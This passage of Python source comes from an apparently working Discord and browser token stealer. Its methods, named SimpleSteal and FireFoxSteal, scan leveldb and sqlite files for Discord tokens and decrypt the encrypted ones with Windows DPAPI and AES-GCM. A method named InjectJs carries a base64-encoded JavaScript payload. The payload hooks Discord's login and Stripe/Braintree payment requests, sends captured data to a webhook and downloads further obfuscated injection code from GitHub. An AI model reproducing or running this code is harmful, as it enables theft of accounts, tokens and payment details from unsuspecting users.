                                    match = match.rstrip('\\')
                                    if not match in encryptedTokens:
                                        match = base64.b64decode(match.split('dQw4w9WgXcQ:')[1].encode())
                                        encryptedTokens.append(match)
        for token in encryptedTokens:
            try:
                token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors='ignore')
                if token:
                    tokens.append(token)
            except Exception:
                pass
        return tokens

    @staticmethod
    def SimpleSteal(path: str) -> list[str]:
        tokens = list()
        levelDbPaths = list()
        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith(('.log', '.ldb')):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                    for line in lines:
                        if line.strip():
                            matches: list[str] = re.findall(Discord.REGEX, line.strip())
                            for match in matches:
                                match = match.rstrip('\\')
                                if not match in tokens:
                                    tokens.append(match)
        return tokens

    @staticmethod
    def FireFoxSteal(path: str) -> list[str]:
        tokens = list()
        for root, _, files in os.walk(path):
            for file in files:
                if file.lower().endswith('.sqlite'):
                    filepath = os.path.join(root, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in tokens:
                                        tokens.append(match)
        return tokens

    @staticmethod
    def InjectJs() -> str | None:
        check = False
        try:
            code = base64.b64decode(b'Ly8gQ3JlZGl0cyAtPiBnaXRodWIvYWRkaTAwMDAwCi8vIEkganVzdCBtb2RpZmllZCB0aGUgb3JpZ2luYWwgc2NyaXB0IHRvIHN1aXQgbXkgbmVlZHMuCgpjb25zdCBhcmdzID0gcHJvY2Vzcy5hcmd2Owpjb25zdCBmcyA9IHJlcXVpcmUoJ2ZzJyk7CmNvbnN0IHBhdGggPSByZXF1aXJlKCdwYXRoJyk7CmNvbnN0IGh0dHBzID0gcmVxdWlyZSgnaHR0cHMnKTsKY29uc3QgcXVlcnlzdHJpbmcgPSByZXF1aXJlKCdxdWVyeXN0cmluZycpOwpjb25zdCB7IEJyb3dzZXJXaW5kb3csIHNlc3Npb24gfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CmNvbnN0IEJ1ZmZlciA9IHJlcXVpcmUoJ2J1ZmZlcicpLkJ1ZmZlcgpjb25zdCBob29rID0gJyVXRUJIT09LSEVSRUJBU0U2NEVOQ09ERUQlJwoKY29uc3QgY29uZmlnID0gewogIHdlYmhvb2s6IEJ1ZmZlci5mcm9tKGhvb2ssICdiYXNlNjQnKS50b1N0cmluZygnYXNjaWknKSwKICB3ZWJob29rX3Byb3RlY3Rvcl9rZXk6ICclV0VCSE9PS19LRVklJywKICBhdXRvX2J1eV9uaXRybzogZmFsc2UsIAogIHBpbmdfb25fcnVuOiB0cnVlLCAKICBwaW5nX3ZhbDogJ0BldmVyeW9uZScsIAogIGVtYmVkX25hbWU6ICdQaHhudDBtIEluamVjdGlvbicsIAogIGVtYmVkX2ljb246ICdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMTIzNzEyMjMzOTk0NzE5MzA1LzExMjQ3NDYwMDY0OTY1NTUxNjAvb25pXzU4ODkxNjYucG5nJywgCiAgZW1iZWRfY29sb3I6IDAsIAogIGluamVjdGlvbl91cmw6ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQmxhbmstYy9CbGFuay1HcmFiYmVyL21haW4vQmxhbmslMjBHcmFiYmVyL0RhdGEvaW5qZWN0aW9uLW9iZnVzY2F0ZWQuanMnLCAKCiAgYXBpOiAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lJywKICBuaXRybzogewogICAgYm9vc3Q6IHsKICAgICAgeWVhcjogewogICAgICAgIGlkOiAnNTIxODQ3MjM0MjQ2MDgyNTk5JywKICAgICAgICBza3U6ICc1MTE2NTE4ODU0NTk5NjM5MDQnLAogICAgICAgIHByaWNlOiAnOTk5OScsCiAgICAgIH0sCiAgICAgIG1vbnRoOiB7CiAgICAgICAgaWQ6ICc1MjE4NDcyMzQyNDYwODI1OTknLAogICAgICAgIHNrdTogJzUxMTY1MTg4MDgzNzg0MDg5NicsCiAgICAgICAgcHJpY2U6ICc5OTknLAogICAgICB9LAogICAgfSwKICAgIGNsYXNzaWM6IHsKICAgICAgbW9udGg6IHsKICAgICAgICBpZDogJzUyMTg0NjkxODYzNzQyMDU0NScsCiAgICAgICAgc2t1OiAnNTExNjUxODcxNzM2MjAxMjE2JywKICAgICAgICBwcmljZTogJzQ5OScsCiAgICAgIH0sCiAgICB9LAogIH0sCiAgZmlsdGVyOiB7CiAgICB1cmxzOiBbCiAgICAgICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUnLAogICAgICAnaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdiovdXNlcnMvQG1lJywKICAgICAgJ2h0dHBzOi8vKi5kaXNjb3JkLmNvbS9hcGkvdiovdXNlcnMvQG1lJywKICAgICAgJ2h0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLAogICAgICAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdiovYXV0aC9sb2dpbicsCiAgICAgICdodHRwczovLyouZGlzY29yZC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLAogICAgICAnaHR0cHM6Ly9hcGkuYnJhaW50cmVlZ2F0ZXdheS5jb20vbWVyY2hhbnRzLzQ5cHAycnA0cGh5bTczODcvY2xpZW50X2FwaS92Ki9wYXltZW50X21ldGhvZHMvcGF5cGFsX2FjY291bnRzJywKICAgICAgJ2h0dHBzOi8vYXBpLnN0cmlwZS5jb20vdiovdG9rZW5zJywKICAgICAgJ2h0dHBzOi8vYXBpLnN0cmlwZS5jb20vdiovc2V0dXBfaW50ZW50cy8qL2NvbmZpcm0nLAogICAgICAnaHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki9wYXltZW50X2ludGVudHMvKi9jb25maXJtJywKICAgIF0sCiAgfSwKICBmaWx0ZXIyOiB7CiAgICB1cmxzOiBbCiAgICAgICdodHRwczovL3N0YXR1cy5kaXNjb3JkLmNvbS9hcGkvdiovc2NoZWR1bGVkLW1haW50ZW5hbmNlcy91cGNvbWluZy5qc29uJywKICAgICAgJ2h0dHBzOi8vKi5kaXNjb3JkLmNvbS9hcGkvdiovYXBwbGljYXRpb25zL2RldGVjdGFibGUnLAogICAgICAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdiovYXBwbGljYXRpb25zL2RldGVjdGFibGUnLAogICAgICAnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUvbGlicmFyeScsCiAgICAgICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUvbGlicmFyeScsCiAgICAgICd3c3M6Ly9yZW1vdGUtYXV0aC1nYXRld2F5LmRpc2NvcmQuZ2cvKicsCiAgICBdLAogIH0sCn07CgpmdW5jdGlvbiBwYXJpdHlfMzIoeCwgeSwgeikgewogIHJldHVybiB4IF4geSBeIHo7Cn0KZnVuY3Rpb24gY2hfMzIoeCwgeSwgeikgewogIHJldHVybiAoeCAmIHkpIF4gKH54ICYgeik7Cn0KCmZ1bmN0aW9uIG1hal8zMih4LCB5LCB6KSB7CiAgcmV0dXJuICh4ICYgeSkgXiAoeCAmIHopIF4gKHkgJiB6KTsKfQpmdW5jdGlvbiByb3RsXzMyKHgsIG4pIHsKICByZXR1cm4gKHggPDwgbikgfCAoeCA+Pj4gKDMyIC0gbikpOwp9CmZ1bmN0aW9uIHNhZmVBZGRfMzJfMihhLCBiKSB7CiAgdmFyIGxzdyA9IChhICYgMHhmZmZmKSArIChiICYgMHhmZmZmKSwKICAgIG1zdyA9IChhID4+PiAxNikgKyAoYiA+Pj4gMTYpICsgKGxzdyA+Pj4gMTYpOwoKICByZXR1cm4gKChtc3cgJiAweGZmZmYpIDw8IDE2KSB8IChsc3cgJiAweGZmZmYpOwp9CmZ1bmN0aW9uIHNhZmVBZGRfMzJfNShhLCBiLCBjLCBkLCBlKSB7CiAgdmFyIGxzdyA9IChhICYgMHhmZmZmKSArIChiICYgMHhmZmZmKSArIChjICYgMHhmZmZmKSArIChkICYgMHhmZmZmKSArIChlICYgMHhmZmZmKSwKICAgIG1zdyA9IChhID4+PiAxNikgKyAoYiA+Pj4gMTYpICsgKGMgPj4+IDE2KSArIChkID4+PiAxNikgKyAoZSA+Pj4gMTYpICsgKGxzdyA+Pj4gMTYpOwoKICByZXR1cm4gKChtc3cgJiAweGZmZmYpIDw8IDE2KSB8IChsc3cgJiAweGZmZmYpOwp9CmZ1bmN0aW9uIGJpbmIyaGV4KGJpbmFycmF5KSB7CiAgdmFyIGhleF90YWIgPSAnMDEyMzQ1Njc4OWFiY2RlZicsCiAgICBzdHIgPSAnJywKICAgIGxlbmd0aCA9IGJpbmFycmF5Lmxlbmd0aCAqIDQsCiAgICBpLAogICAgc3JjQnl0ZTsKCiAgZm9yIChpID0gMDsgaSA8IGxlbmd0aDsgaSArPSAxKSB7CiAgICBzcmNCeXRlID0gYmluYXJyYXlbaSA+Pj4gMl0gPj4+ICgoMyAtIChpICUgNCkpICogOCk7CiAgICBzdHIgKz0gaGV4X3RhYi5jaGFyQXQoKHNyY0J5dGUgPj4+IDQpICYgMHhmKSArIGhleF90YWIuY2hhckF0KHNyY0J5dGUgJiAweGYpOwogIH0KCiAgcmV0dXJuIHN0cjsKfQoKZnVuY3Rpb24gZ2V0SCgpIHsKICByZXR1cm4gWzB4Njc0NTIzMDEsIDB4ZWZjZGFiODksIDB4OThiYWRjZmUsIDB4MTAzMjU0NzYsIDB4YzNkMmUxZjBdOwp9CmZ1bmN0aW9uIHJvdW5kU0hBMShibG9jaywgSCkgewogIHZhciBXID0gW10sCiAgICBhLAogICAgYiwKICAgIGMsCiAgICBkLAogICAgZSwKICAgIFQsCiAgICBjaCA9IGNoXzMyLAogICAgcGFyaXR5ID0gcGFyaXR5XzMyLAogICAgbWFqID0gbWFqXzMyLAogICAgcm90bCA9IHJvdGxfMzIsCiAgICBzYWZlQWRkXzIgPSBzYWZlQWRkXzMyXzIsCiAgICB0LAogICAgc2FmZUFkZF81ID0gc2FmZUFkZF8zMl81OwoKICBhID0gSFswXTsKICBiID0gSFsxXTsKICBjID0gSFsyXTsKICBkID0gSFszXTsKICBlID0gSFs0XTsKCiAgZm9yICh0ID0gMDsgdCA8IDgwOyB0ICs9IDEpIHsKICAgIGlmICh0IDwgMTYpIHsKICAgICAgV1t0XSA9IGJsb2NrW3RdOwogICAgfSBlbHNlIHsKICAgICAgV1t0XSA9IHJvdGwoV1t0IC0gM10gXiBXW3QgLSA4XSBeIFdbdCAtIDE0XSBeIFdbdCAtIDE2XSwgMSk7CiAgICB9CgogICAgaWYgKHQgPCAyMCkgewogICAgICBUID0gc2FmZUFkZF81KHJvdGwoYSwgNSksIGNoKGIsIGMsIGQpLCBlLCAweDVhODI3OTk5LCBXW3RdKTsKICAgIH0gZWxzZSBpZiAodCA8IDQwKSB7CiAgICAgIFQgPSBzYWZlQWRkXzUocm90bChhLCA1KSwgcGFyaXR5KGIsIGMsIGQpLCBlLCAweDZlZDllYmExLCBXW3RdKTsKICAgIH0gZWxzZSBpZiAodCA8IDYwKSB7CiAgICAgIFQgPSBzYWZlQWRkXzUocm90bChhLCA1KSwgbWFqKGIsIGMsIGQpLCBlLCAweDhmMWJiY2RjLCBXW3RdKTsKICAgIH0gZWxzZSB7CiAgICAgIFQgPSBzYWZlQWRkXzUocm90bChhLCA1KSwgcGFyaXR5KGIsIGMsIGQpLCBlLCAweGNhNjJjMWQ2LCBXW3RdKTsKICAgIH0KCiAgICBlID0gZDsKICAgIGQgPSBjOwogICAgYyA9IHJvdGwoYiwgMzApOwogICAgYiA9IGE7CiAgICBhID0gVDsKICB9CgogIEhbMF0gPSBzYWZlQWRkXzIoYSwgSFswXSk7CiAgSFsxXSA9IHNhZmVBZGRfMihiLCBIWzFdKTsKICBIWzJdID0gc2FmZUFkZF8yKGMsIEhbMl0pOwogIEhbM10gPSBzYWZlQWRkXzIoZCwgSFszXSk7CiAgSFs0XSA9IHNhZmVBZGRfMihlLCBIWzRdKTsKCiAgcmV0dXJuIEg7Cn0KCmZ1bmN0aW9uIGZpbmFsaXplU0hBMShyZW1haW5kZXIsIHJlbWFpbmRlckJpbkxlbiwgcHJvY2Vzc2VkQmluTGVuLCBIKSB7CiAgdmFyIGksIGFwcGVuZGVkTWVzc2FnZUxlbmd0aCwgb2Zmc2V0OwoKICBvZmZzZXQgPSAoKChyZW1haW5kZXJCaW5MZW4gKyA2NSkgPj4+IDkpIDw8IDQpICsgMTU7CiAgd2hpbGUgKHJlbWFpbmRlci5sZW5ndGggPD0gb2Zmc2V0KSB7CiAgICByZW1haW5kZXIucHVzaCgwKTsKICB9CiAgcmVtYWluZGVyW3JlbWFpbmRlckJpbkxlbiA+Pj4gNV0gfD0gMHg4MCA8PCAoMjQgLSAocmVtYWluZGVyQmluTGVuICUgMzIpKTsKICByZW1haW5kZXJbb2Zmc2V0XSA9IHJlbWFpbmRlckJpbkxlbiArIHByb2Nlc3NlZEJpbkxlbjsKICBhcHBlbmRlZE1lc3NhZ2VMZW5ndGggPSByZW1haW5kZXIubGVuZ3RoOwoKICBmb3IgKGkgPSAwOyBpIDwgYXBwZW5kZWRNZXNzYWdlTGVuZ3RoOyBpICs9IDE2KSB7CiAgICBIID0gcm91bmRTSEExKHJlbWFpbmRlci5zbGljZShpLCBpICsgMTYpLCBIKTsKICB9CiAgcmV0dXJuIEg7Cn0KCmZ1bmN0aW9uIGhleDJiaW5iKHN0ciwgZXhpc3RpbmdCaW4sIGV4aXN0aW5nQmluTGVuKSB7CiAgdmFyIGJpbiwKICAgIGxlbmd0aCA9IHN0ci5sZW5ndGgsCiAgICBpLAogICAgbnVtLAogICAgaW50T2Zmc2V0LAogICAgYnl0ZU9mZnNldCwKICAgIGV4aXN0aW5nQnl0ZUxlbjsKCiAgYmluID0gZXhpc3RpbmdCaW4gfHwgWzBdOwogIGV4aXN0aW5nQmluTGVuID0gZXhpc3RpbmdCaW5MZW4gfHwgMDsKICBleGlzdGluZ0J5dGVMZW4gPSBleGlzdGluZ0JpbkxlbiA+Pj4gMzsKCiAgaWYgKDAgIT09IGxlbmd0aCAlIDIpIHsKICAgIGNvbnNvbGUuZXJyb3IoJ1N0cmluZyBvZiBIRVggdHlwZSBtdXN0IGJlIGluIGJ5dGUgaW5jcmVtZW50cycpOwogIH0KCiAgZm9yIChpID0gMDsgaSA8IGxlbmd0aDsgaSArPSAyKSB7CiAgICBudW0gPSBwYXJzZUludChzdHIuc3Vic3RyKGksIDIpLCAxNik7CiAgICBpZiAoIWlzTmFOKG51bSkpIHsKICAgICAgYnl0ZU9mZnNldCA9IChpID4+PiAxKSArIGV4aXN0aW5nQnl0ZUxlbjsKICAgICAgaW50T2Zmc2V0ID0gYnl0ZU9mZnNldCA+Pj4gMjsKICAgICAgd2hpbGUgKGJpbi5sZW5ndGggPD0gaW50T2Zmc2V0KSB7CiAgICAgICAgYmluLnB1c2goMCk7CiAgICAgIH0KICAgICAgYmluW2ludE9mZnNldF0gfD0gbnVtIDw8ICg4ICogKDMgLSAoYnl0ZU9mZnNldCAlIDQpKSk7CiAgICB9IGVsc2UgewogICAgICBjb25zb2xlLmVycm9yKCdTdHJpbmcgb2YgSEVYIHR5cGUgY29udGFpbnMgaW52YWxpZCBjaGFyYWN0ZXJzJyk7CiAgICB9CiAgfQoKICByZXR1cm4geyB2YWx1ZTogYmluLCBiaW5MZW46IGxlbmd0aCAqIDQgKyBleGlzdGluZ0JpbkxlbiB9Owp9CgpjbGFzcyBqc1NIQSB7CiAgY29uc3RydWN0b3IoKSB7CiAgICB2YXIgcHJvY2Vzc2VkTGVuID0gMCwKICAgICAgcmVtYWluZGVyID0gW10sCiAgICAgIHJlbWFpbmRlckxlbiA9IDAsCiAgICAgIGludGVybWVkaWF0ZUgsCiAgICAgIGNvbnZlcnRlckZ1bmMsCiAgICAgIG91dHB1dEJpbkxlbiwKICAgICAgdmFyaWFudEJsb2NrU2l6ZSwKICAgICAgcm91bmRGdW5jLAogICAgICBmaW5hbGl6ZUZ1bmMsCiAgICAgIGZpbmFsaXplZCA9IGZhbHNlLAogICAgICBobWFjS2V5U2V0ID0gZmFsc2UsCiAgICAgIGtleVdpdGhJUGFkID0gW10sCiAgICAgIGtleVdpdGhPUGFkID0gW10sCiAgICAgIG51bVJvdW5kcywKICAgICAgbnVtUm91bmRzID0gMTsKCiAgICBjb252ZXJ0ZXJGdW5jID0gaGV4MmJpbmI7CgogICAgaWYgKG51bVJvdW5kcyAhPT0gcGFyc2VJbnQobnVtUm91bmRzLCAxMCkgfHwgMSA+IG51bVJvdW5kcykgewogICAgICBjb25zb2xlLmVycm9yKCdudW1Sb3VuZHMgbXVzdCBhIGludGVnZXIgPj0gMScpOwogICAgfQogICAgdmFyaWFudEJsb2NrU2l6ZSA9IDUxMjsKICAgIHJvdW5kRnVuYyA9IHJvdW5kU0hBMTsKICAgIGZpbmFsaXplRnVuYyA9IGZpbmFsaXplU0hBMTsKICAgIG91dHB1dEJpbkxlbiA9IDE2MDsKICAgIGludGVybWVkaWF0ZUggPSBnZXRIKCk7CgogICAgdGhpcy5zZXRITUFDS2V5ID0gZnVuY3Rpb24gKGtleSkgewogICAgICB2YXIga2V5Q29udmVydGVyRnVuYywgY29udmVydFJldCwga2V5QmluTGVuLCBrZXlUb1VzZSwgYmxvY2tCeXRlU2l6ZSwgaSwgbGFzdEFycmF5SW5kZXg7CiAgICAgIGtleUNvbnZlcnRlckZ1bmMgPSBoZXgyYmluYjsKICAgICAgY29udmVydFJldCA9IGtleUNvbnZlcnRlckZ1bmMoa2V5KTsKICAgICAga2V5QmluTGVuID0gY29udmVydFJldFsnYmluTGVuJ107CiAgICAgIGtleVRvVXNlID0gY29udmVydFJldFsndmFsdWUnXTsKICAgICAgYmxvY2tCeXRlU2l6ZSA9IHZhcmlhbnRCbG9ja1NpemUgPj4+IDM7CiAgICAgIGxhc3RBcnJheUluZGV4ID0gYmxvY2tCeXRlU2l6ZSAvIDQgLSAxOwoKICAgICAgaWYgKGJsb2NrQnl0ZVNpemUgPCBrZXlCaW5MZW4gLyA4KSB7CiAgICAgICAga2V5VG9Vc2UgPSBmaW5hbGl6ZUZ1bmMoa2V5VG9Vc2UsIGtleUJpbkxlbiwgMCwgZ2V0SCgpKTsKICAgICAgICB3aGlsZSAoa2V5VG9Vc2UubGVuZ3RoIDw9IGxhc3RBcnJheUluZGV4KSB7CiAgICAgICAgICBrZXlUb1VzZS5wdXNoKDApOwogICAgICAgIH0KICAgICAgICBrZXlUb1VzZVtsYXN0QXJyYXlJbmRleF0gJj0gMHhmZmZmZmYwMDsKICAgICAgfSBlbHNlIGlmIChibG9ja0J5dGVTaXplID4ga2V5QmluTGVuIC8gOCkgewogICAgICAgIHdoaWxlIChrZXlUb1VzZS5sZW5ndGggPD0gbGFzdEFycmF5SW5kZXgpIHsKICAgICAgICAgIGtleVRvVXNlLnB1c2goMCk7CiAgICAgICAgfQogICAgICAgIGtleVRvVXNlW2xhc3RBcnJheUluZGV4XSAmPSAweGZmZmZmZjAwOwogICAgICB9CgogICAgICBmb3IgKGkgPSAwOyBpIDw9IGxhc3RBcnJheUluZGV4OyBpICs9IDEpIHsKICAgICAgICBrZXlXaXRoSVBhZFtpXSA9IGtleVRvVXNlW2ldIF4gMHgzNjM2MzYzNjsKICAgICAgICBrZXlXaXRoT1BhZFtpXSA9IGtleVRvVXNlW2ldIF4gMHg1YzVjNWM1YzsKICAgICAgfQoKICAgICAgaW50ZXJtZWRpYXRlSCA9IHJvdW5kRnVuYyhrZXlXaXRoSVBhZCwgaW50ZXJtZWRpYXRlSCk7CiAgICAgIHByb2Nlc3NlZExlbiA9IHZhcmlhbnRCbG9ja1NpemU7CgogICAgICBobWFjS2V5U2V0ID0gdHJ1ZTsKICAgIH07CgogICAgdGhpcy51cGRhdGUgPSBmdW5jdGlvbiAoc3JjU3RyaW5nKSB7CiAgICAgIHZhciBjb252ZXJ0UmV0LAogICAgICAgIGNodW5rQmluTGVuLAogICAgICAgIGNodW5rSW50TGVuLAogICAgICAgIGNodW5rLAogICAgICAgIGksCiAgICAgICAgdXBkYXRlUHJvY2Vzc2VkTGVuID0gMCwKICAgICAgICB2YXJpYW50QmxvY2tJbnRJbmMgPSB2YXJpYW50QmxvY2tTaXplID4+PiA1OwoKICAgICAgY29udmVydFJldCA9IGNvbnZlcnRlckZ1bmMoc3JjU3RyaW5nLCByZW1haW5kZXIsIHJlbWFpbmRlckxlbik7CiAgICAgIGNodW5rQmluTGVuID0gY29udmVydFJldFsnYmluTGVuJ107CiAgICAgIGNodW5rID0gY29udmVydFJldFsndmFsdWUnXTsKCiAgICAgIGNodW5rSW50TGVuID0gY2h1bmtCaW5MZW4gPj4+IDU7CiAgICAgIGZvciAoaSA9IDA7IGkgPCBjaHVua0ludExlbjsgaSArPSB2YXJpYW50QmxvY2tJbnRJbmMpIHsKICAgICAgICBpZiAodXBkYXRlUHJvY2Vzc2VkTGVuICsgdmFyaWFudEJsb2NrU2l6ZSA8PSBjaHVua0JpbkxlbikgewogICAgICAgICAgaW50ZXJtZWRpYXRlSCA9IHJvdW5kRnVuYyhjaHVuay5zbGljZShpLCBpICsgdmFyaWFudEJsb2NrSW50SW5jKSwgaW50ZXJtZWRpYXRlSCk7CiAgICAgICAgICB1cGRhdGVQcm9jZXNzZWRMZW4gKz0gdmFyaWFudEJsb2NrU2l6ZTsKICAgICAgICB9CiAgICAgIH0KICAgICAgcHJvY2Vzc2VkTGVuICs9IHVwZGF0ZVByb2Nlc3NlZExlbjsKICAgICAgcmVtYWluZGVyID0gY2h1bmsuc2xpY2UodXBkYXRlUHJvY2Vzc2VkTGVuID4+PiA1KTsKICAgICAgcmVtYWluZGVyTGVuID0gY2h1bmtCaW5MZW4gJSB2YXJpYW50QmxvY2tTaXplOwogICAgfTsKCiAgICB0aGlzLmdldEhNQUMgPSBmdW5jdGlvbiAoKSB7CiAgICAgIHZhciBmaXJzdEhhc2g7CgogICAgICBpZiAoZmFsc2UgPT09IGhtYWNLZXlTZXQpIHsKICAgICAgICBjb25zb2xlLmVycm9yKCdDYW5ub3QgY2FsbCBnZXRITUFDIHdpdGhvdXQgZmlyc3Qgc2V0dGluZyBITUFDIGtleScpOwogICAgICB9CgogICAgICBjb25zdCBmb3JtYXRGdW5jID0gZnVuY3Rpb24gKGJpbmFycmF5KSB7CiAgICAgICAgcmV0dXJuIGJpbmIyaGV4KGJpbmFycmF5KTsKICAgICAgfTsKCiAgICAgIGlmIChmYWxzZSA9PT0gZmluYWxpemVkKSB7CiAgICAgICAgZmlyc3RIYXNoID0gZmluYWxpemVGdW5jKHJlbWFpbmRlciwgcmVtYWluZGVyTGVuLCBwcm9jZXNzZWRMZW4sIGludGVybWVkaWF0ZUgpOwogICAgICAgIGludGVybWVkaWF0ZUggPSByb3VuZEZ1bmMoa2V5V2l0aE9QYWQsIGdldEgoKSk7CiAgICAgICAgaW50ZXJtZWRpYXRlSCA9IGZpbmFsaXplRnVuYyhmaXJzdEhhc2gsIG91dHB1dEJpbkxlbiwgdmFyaWFudEJsb2NrU2l6ZSwgaW50ZXJtZWRpYXRlSCk7CiAgICAgIH0KCiAgICAgIGZpbmFsaXplZCA9IHRydWU7CiAgICAgIHJldHVybiBmb3JtYXRGdW5jKGludGVybWVkaWF0ZUgpOwogICAgfTsKICB9Cn0KCmlmICgnZnVuY3Rpb24nID09PSB0eXBlb2YgZGVmaW5lICYmIGRlZmluZVsnYW1kJ10pIHsKICBkZWZpbmUoZnVuY3Rpb24gKCkgewogICAgcmV0dXJuIGpzU0hBOwogIH0pOwp9IGVsc2UgaWYgKCd1bmRlZmluZWQnICE9PSB0eXBlb2YgZXhwb3J0cykgewogIGlmICgndW5kZWZpbmVkJyAhPT0gdHlwZW9mIG1vZHVsZSAmJiBtb2R1bGVbJ2V4cG9ydHMnXSkgewogICAgbW9kdWxlWydleHBvcnRzJ10gPSBleHBvcnRzID0ganNTSEE7CiAgfSBlbHNlIHsKICAgIGV4cG9ydHMgPSBqc1NIQTsKICB9Cn0gZWxzZSB7CiAgZ2xvYmFsWydqc1NIQSddID0ganNTSEE7Cn0KCmlmIChqc1NIQS5kZWZhdWx0KSB7CiAganNTSEEgPSBqc1NIQS5kZWZhdWx0Owp9CgpmdW5jdGlvbiB0b3RwKGtleSkgewogIGNvbnN0IHBlcmlvZCA9IDMwOwogIGNvbnN0IGRpZ2l0cyA9IDY7CiAgY29uc3QgdGltZXN0YW1wID0gRGF0ZS5ub3coKTsKICBjb25zdCBlcG9jaCA9IE1hdGgucm91bmQodGltZXN0YW1wIC8gMTAwMC4wKTsKICBjb25zdCB0aW1lID0gbGVmdHBhZChkZWMyaGV4KE1hdGguZmxvb3IoZXBvY2ggLyBwZXJpb2QpKSwgMTYsICcwJyk7CiAgY29uc3Qgc2hhT2JqID0gbmV3IGpzU0hBKCk7CiAgc2hhT2JqLnNldEhNQUNLZXkoYmFzZTMydG9oZXgoa2V5KSk7CiAgc2hhT2JqLnVwZGF0ZSh0aW1lKTsKICBjb25zdCBobWFjID0gc2hhT2JqLmdldEhNQUMoKTsKICBjb25zdCBvZmZzZXQgPSBoZXgyZGVjKGhtYWMuc3Vic3RyaW5nKGhtYWMubGVuZ3RoIC0gMSkpOwogIGxldCBvdHAgPSAoaGV4MmRlYyhobWFjLnN1YnN0cihvZmZzZXQgKiAyLCA4KSkgJiBoZXgyZGVjKCc3ZmZmZmZmZicpKSArICcnOwogIG90cCA9IG90cC5zdWJzdHIoTWF0aC5tYXgob3RwLmxlbmd0aCAtIGRpZ2l0cywgMCksIGRpZ2l0cyk7CiAgcmV0dXJuIG90cDsKfQoKZnVuY3Rpb24gaGV4MmRlYyhzKSB7CiAgcmV0dXJuIHBhcnNlSW50KHMsIDE2KTsKfQoKZnVuY3Rpb24gZGVjMmhleChzKSB7CiAgcmV0dXJuIChzIDwgMTUuNSA/ICcwJyA6ICcnKSArIE1hdGgucm91bmQocykudG9TdHJpbmcoMTYpOwp9CgpmdW5jdGlvbiBiYXNlMzJ0b2hleChiYXNlMzIpIHsKICBsZXQgYmFzZTMyY2hhcnMgPSAnQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoyMzQ1NjcnLAogICAgYml0cyA9ICcnLAogICAgaGV4ID0gJyc7CgogIGJhc2UzMiA9IGJhc2UzMi5yZXBsYWNlKC89KyQvLCAnJyk7CgogIGZvciAobGV0IGkgPSAwOyBpIDwgYmFzZTMyLmxlbmd0aDsgaSsrKSB7CiAgICBsZXQgdmFsID0gYmFzZTMyY2hhcnMuaW5kZXhPZihiYXNlMzIuY2hhckF0KGkpLnRvVXBwZXJDYXNlKCkpOwogICAgaWYgKHZhbCA9PT0gLTEpIGNvbnNvbGUuZXJyb3IoJ0ludmFsaWQgYmFzZTMyIGNoYXJhY3RlciBpbiBrZXknKTsKICAgIGJpdHMgKz0gbGVmdHBhZCh2YWwudG9TdHJpbmcoMiksIDUsICcwJyk7CiAgfQoKICBmb3IgKGxldCBpID0gMDsgaSArIDggPD0gYml0cy5sZW5ndGg7IGkgKz0gOCkgewogICAgbGV0IGNodW5rID0gYml0cy5zdWJzdHIoaSwgOCk7CiAgICBoZXggPSBoZXggKyBsZWZ0cGFkKHBhcnNlSW50KGNodW5rLCAyKS50b1N0cmluZygxNiksIDIsICcwJyk7CiAgfQogIHJldHVybiBoZXg7Cn0KCmZ1bmN0aW9uIGxlZnRwYWQoc3RyLCBsZW4sIHBhZCkgewogIGlmIChsZW4gKyAxID49IHN0ci5sZW5ndGgpIHsKICAgIHN0ciA9IEFycmF5KGxlbiArIDEgLSBzdHIubGVuZ3RoKS5qb2luKHBhZCkgKyBzdHI7CiAgfQogIHJldHVybiBzdHI7Cn0KCmNvbnN0IGRpc2NvcmRQYXRoID0gKGZ1bmN0aW9uICgpIHsKICBjb25zdCBhcHAgPSBhcmdzWzBdLnNwbGl0KHBhdGguc2VwKS5zbGljZSgwLCAtMSkuam9pbihwYXRoLnNlcCk7CiAgbGV0IHJlc291cmNlUGF0aDsKCiAgaWYgKHByb2Nlc3MucGxhdGZvcm0gPT09ICd3aW4zMicpIHsKICAgIHJlc291cmNlUGF0aCA9IHBhdGguam9pbihhcHAsICdyZXNvdXJjZXMnKTsKICB9IGVsc2UgaWYgKHByb2Nlc3MucGxhdGZvcm0gPT09ICdkYXJ3aW4nKSB7CiAgICByZXNvdXJjZVBhdGggPSBwYXRoLmpvaW4oYXBwLCAnQ29udGVudHMnLCAnUmVzb3VyY2VzJyk7CiAgfQoKICBpZiAoZnMuZXhpc3RzU3luYyhyZXNvdXJjZVBhdGgpKSByZXR1cm4geyByZXNvdXJjZVBhdGgsIGFwcCB9OwogIHJldHVybiB7IHVuZGVmaW5lZCwgdW5kZWZpbmVkIH07Cn0pKCk7CgpmdW5jdGlvbiB1cGRhdGVDaGVjaygpIHsKICBjb25zdCB7IHJlc291cmNlUGF0aCwgYXBwIH0gPSBkaXNjb3JkUGF0aDsKICBpZiAocmVzb3VyY2VQYXRoID09PSB1bmRlZmluZWQgfHwgYXBwID09PSB1bmRlZmluZWQpIHJldHVybjsKICBjb25zdCBhcHBQYXR